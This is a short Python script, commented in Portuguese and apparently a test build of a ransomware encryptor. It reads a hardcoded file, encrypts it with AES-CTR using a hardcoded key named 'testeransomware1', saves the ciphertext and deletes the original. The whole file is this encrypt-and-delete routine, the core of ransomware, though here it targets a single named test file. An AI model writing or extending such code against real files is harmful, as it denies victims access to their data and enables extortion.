import os
import pyaes

# Abrir o arquivo original
fileName = 'testeDescriptografado.txt'

if not os.path.exists(fileName):
    raise FileNotFoundError(f'Arquivo {fileName} não encontrado')

with open(fileName, 'rb') as openFile:
    fileData = openFile.read()

# Chave de criptografia (deve ter 16, 24 ou 32 bytes)
encryptKey = b'testeransomware1'  # 16 bytes
aes = pyaes.AESModeOfOperationCTR(encryptKey)
encrypt_data = aes.encrypt(fileData)

# Salvar arquivo criptografado antes de remover o original
encryptedFileName = 'testeCriptografia.txt'
with open(encryptedFileName, 'wb') as newFile:
    newFile.write(encrypt_data)

# Remover o arquivo original somente após salvar o criptografado
os.remove(fileName)
